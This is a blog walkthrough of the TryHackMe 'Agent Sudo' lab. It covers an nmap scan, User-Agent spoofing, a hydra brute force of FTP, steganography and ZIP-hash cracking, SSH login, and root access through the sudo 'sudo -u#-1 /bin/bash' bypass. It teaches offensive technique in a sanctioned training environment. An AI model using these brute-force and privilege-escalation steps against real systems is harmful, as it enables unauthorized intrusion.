---
title: 'TryHackMe WriteUp | Agent Sudo'
date: '2022-06-11T08:59:17-04:00'
layout: post
author: jazzy_j
permalink: /2022/06/tryhackme-writeup-agent-sudo/
image: /assets/uploads/2022/06/agent-sudo.png
tags: [agentsudo, tryhackme, Write-Up]
---

> **Description:** You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

## Recon

Let's start with some enumeration by running a nmap scan:

```
┌──(root㉿kali)-[~/THM/Agent Sudo]
└─# nmap -sV -Pn -T4 -A 10.10.205.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-09 19:36 EDT
Nmap scan report for 10.10.205.169
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
<snip>
.......
```

![](/assets/uploads/2022/06/2022-06-10-22_23_22-Targets.png)
Looks like there are three ports open

- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)

Navigating to the URL in the browser shows us the following message:

![](/assets/uploads/2022/06/2022-06-10-22_25_30-Targets.png)
Inspecting the page source doesn’t lead to anything but the message on the page from Agent R mentions changing their own codename as `user-agent` to access the site.

Using Burp, let's change the User-Agent to C instead of the browser.

![](/assets/uploads/2022/06/2022-06-10-22_28_43-Targets.png)
This seems to go to a redirected link which is /agent\_C\_attention.php:

![](/assets/uploads/2022/06/2022-06-10-22_30_04-Targets.png)
Going to http://10.10.205.169/agent\_C\_attention.php reveals the following message:

![](/assets/uploads/2022/06/2022-06-10-22_31_45-Targets.png)
It looks like the agent’s name is chris, so let’s use hydra to try and enumerate each service to try and brute force a password:

```
┌──(root㉿kali)-[~/THM/Agent Sudo]
└─# hydra -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.205.169 ftp
```

And it looks like we got a password for the FTP account:

![](/assets/uploads/2022/06/2022-06-10-22_34_44-Targets.png)
Let’s try and use those credentials to FTP into the server:

![](/assets/uploads/2022/06/2022-06-10-22_36_49-Targets.png)
Looking around, I see the following files:

![](/assets/uploads/2022/06/2022-06-10-22_37_36-Targets.png)
We need to download the files by running the **mget** command which will download the files to the kali vm.

```
mget *
```

![](/assets/uploads/2022/06/2022-06-10-22_39_20-Targets.png)
Now that the files are on the kali vm, let's take a look at them. Looking at the **To\_agentJ.txt** file reveals that Agent J’s password is stored in the fake picture.

![](/assets/uploads/2022/06/2022-06-10-22_41_35-Targets.png)
We need to figure out a way to extract data from the image files. I ended up coming across a tool called **binwalk** that allows you to extract any files from an image. You will need to add the --run-as=root flag for binwalk to run properly:

```
──(root㉿kali)-[~/THM/Agent Sudo]
└─# binwalk --run-as=root -e cutie.png
```

![](/assets/uploads/2022/06/2022-06-10-22_45_17-Targets.png)
You should now see a **\_cutie.png.extracted** directory with a ZIP file and text file:

![](/assets/uploads/2022/06/2022-06-10-22_45_51-Targets.png)
Taking an initial look at the **To\_agentR.txt** file it seems to be empty, so let's keep going.

The ZIP file is password protected so we need to use **zip2john** first which will extract the password hash from the ZIP file and output it into the **.hash** file. I just chose that extension, but you can name the output file anything you want.

```
┌──(root㉿kali)-[~/THM/Agent Sudo/_cutie.png.extracted]
└─# zip2john 8702.zip > zipfile.hash
```

Now let’s trying cracking the hash:

```
┌──(root㉿kali)-[~/THM/Agent Sudo/_cutie.png.extracted]
└─# john 8702.zip zipfile.hash
```

And we now have cracked the zip file password:

![](/assets/uploads/2022/06/2022-06-10-22_53_27-Targets.png)
I tried to use `unzip -P` to extract the file but this did not work. I'm going to try and use 7zip with the **e** flag to extract the file instead. This is installed by default on Kali 2022.2.

```
──(root㉿kali)-[~/THM/Agent Sudo/_cutie.png.extracted]
└─# 7z e 8702.zip
```

![](/assets/uploads/2022/06/2022-06-10-22_55_54-Targets.png)
Now, if we look at the **To\_agentR.txt** file, Agent C is saying we need to send the picture to ‘QXJlYTUx’ which looks to be a base64 string:

![](/assets/uploads/2022/06/2022-06-10-22_57_08-Targets.png)
Let’s try and decode the string:

```
──(root㉿kali)-[~/THM/Agent Sudo/_cutie.png.extracted]
└─# echo "QXJlYTUx" | base64 -d; echo ""
```

This comes back with a password:

![](/assets/uploads/2022/06/2022-06-10-22_58_38-Targets.png)
So, now that we have this password, we need to figure out where to use it. If we remember from earlier, Agent R stored the real picture inside of Agent J’s directory. Let’s use the **steghide** tool to try and extract any hidden data. Make sure steghide is installed first.

```
apt install steghide

┌──(root㉿kali)-[~/THM/Agent Sudo]
└─# steghide extract -sf cute-alien.jpg
```

![](/assets/uploads/2022/06/2022-06-10-23_00_27-Targets.png)
The **message.txt** file reveals the name of another agent and a password. Let’s try the credentials for the SSH login

![](/assets/uploads/2022/06/2022-06-10-23_01_37-Targets.png)
This worked and now I’m logged in so let’s look for the user flag

![](/assets/uploads/2022/06/2022-06-10-23_04_01-Targets.png)
Download the jpg file to your kali vm using scp.

Open up the image to see that it’s an image of an alien. Doing a Google search for this image comes back with an article on a faked alien autopsy by a filmmaker.

## Privilege Escalation

It looks like everyone can run /bin/bash except for root

Doing a Google search on this reveals that there’s a security bypass vulnerability in sudo version &lt; 1.8.28 which can be seen here <https://www.exploit-db.com/exploits/47502>

You can check the version of sudo by doing the following

```
sudo -V
```

We see that the version is **1.8.21p2** which means we can exploit sudo on this machine. So let’s try the exploit:

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
```

This worked! Let’s verify that we are root:

![](/assets/uploads/2022/06/2022-06-10-23_11_41-Targets.png)
And now we can look for the root flag:

```
root@agent-sudo:~# find / -type f -name root.txt 2>/dev/null
```

![](/assets/uploads/2022/06/2022-06-10-23_12_26-Targets.png)
And that completes the walkthrough for Agent Sudo. I hope you've found this walkthrough helpful and enjoyed discovering new tips and tricks along the way!

Happy Hacking!